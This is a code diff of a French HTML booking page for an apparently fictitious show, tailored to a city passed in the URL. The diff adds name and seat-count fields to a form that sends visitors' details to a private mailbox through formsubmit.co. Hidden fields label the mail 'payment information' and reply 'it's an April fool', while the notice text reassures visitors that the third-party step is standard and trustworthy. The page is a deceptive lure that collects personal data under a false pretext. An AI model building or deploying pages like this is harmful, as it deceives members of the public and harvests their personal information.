@@ -1,5 +1,4 @@
-<!DOCTYPE html>
-<html lang="fr">
+<!DOCTYPE html><html lang="fr">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -61,6 +60,15 @@
     input::placeholder {
       color: #888;
     }
+    .checkbox {
+      margin-top: 1.5rem;
+      font-size: 0.95rem;
+      color: #444;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+    }
   </style>
 </head>
 <body>
@@ -68,38 +76,44 @@
     <h1>Réservation – <span id="ville">...</span></h1>
     <p>Bienvenue sur la page de réservation pour <span id="ville2">...</span> !<br>
        Ce spectacle est exceptionnel et les places sont limitées.<br>
-       <span id="adresse">Adresse à venir</span></p>
+       <span id="adresse">Adresse à venir</span></p><p class="notice">
+  Pour finaliser votre réservation, vous devrez valider un formulaire sécurisé fourni par notre prestataire externe FormSubmit.<br>
+  Cette étape supplémentaire est essentielle : elle permet de garantir la sécurité de vos données et de lutter contre les envois automatisés (robots).<br>
+  Le message peut s'afficher en anglais. Il s'agit d'une procédure standard et fiable.<br>
+  Votre adresse e-mail sera utilisée uniquement pour vous envoyer les informations de réservation. Aucune donnée n’est conservée après l’envoi.
+</p>
 
-    <p class="notice">
-      Pour finaliser votre réservation, vous devrez valider un formulaire sécurisé fourni par notre prestataire externe FormSubmit.<br>
-      Cette étape supplémentaire est essentielle : elle permet de garantir la sécurité de vos données et de lutter contre les envois automatisés (robots).<br>
-      Le message de vérification peut s'afficher en anglais. Il s'agit d'une procédure standard, fiable et largement utilisée sur le web.<br>
-      Veuillez accepter cette étape pour recevoir correctement vos informations par e-mail.
-    </p>
+<form action="https://formsubmit.co/marcomarco2026@mail.com" method="POST">
+  <input type="hidden" name="_subject" value="Information de paiement">
+  <input type="hidden" name="_autoresponse" value="Désolé, c’est un poisson d’avril 😄">
+  <input type="hidden" name="_template" value="box">
+  <input type="hidden" name="_next" value="https://marcomarco.store/merci.html">
 
-    <form action="https://formsubmit.co/marcomarco2026@mail.com" method="POST">
-      <input type="hidden" name="_subject" value="Information de paiement">
-      <input type="hidden" name="_autoresponse" value="Désolé, c’est un poisson d’avril 😄">
-      <input type="hidden" name="_template" value="box">
-      <input type="hidden" name="_next" value="https://marcomarco.store/merci.html">
+  <label>Votre nom complet :</label><br>
+  <input type="text" name="nom" placeholder="Ex : Marie Dupont" required><br>
 
-      <div>
-        <label for="billet">Choisissez votre billet :</label><br>
-        <select name="billet" required>
-          <option value="">-- Sélectionnez --</option>
-          <option value="standard">Standard - 19€</option>
-          <option value="vip">VIP - 29€</option>
-        </select>
-      </div>
-      <div>
-        <label for="email">Votre adresse e-mail :</label><br>
-        <input type="email" name="email" placeholder="exemple@domaine.com" required>
-      </div>
-      <button type="submit">Valider la réservation</button>
-    </form>
+  <label>Adresse e-mail :</label><br>
+  <input type="email" name="email" placeholder="exemple@domaine.com" required><br>
+
+  <label>Type de billet :</label><br>
+  <select name="billet" required>
+    <option value="">-- Sélectionnez --</option>
+    <option value="standard">Standard - 19€</option>
+    <option value="vip">VIP - 29€</option>
+  </select><br>
+
+  <label>Nombre de places :</label><br>
+  <input type="number" name="places" min="1" max="10" placeholder="1" required><br>
+
+  <div class="checkbox">
+    <input type="checkbox" name="consentement" required>
+    <label for="consentement">J’accepte que mes données soient utilisées uniquement pour cette réservation.</label>
   </div>
 
-  <script>
+  <button type="submit">Valider la réservation</button>
+</form>
+
+  </div>  <script>
     const params = new URLSearchParams(window.location.search);
     const ville = params.get('ville') || 'votre ville';
     const villes = {
@@ -118,6 +132,5 @@
     document.getElementById('ville').textContent = villeNom;
     document.getElementById('ville2').textContent = villeNom;
     document.getElementById('adresse').textContent = villes[ville.toLowerCase()] || 'Adresse à venir';
-  </script>
-</body>
+  </script></body>
 </html>
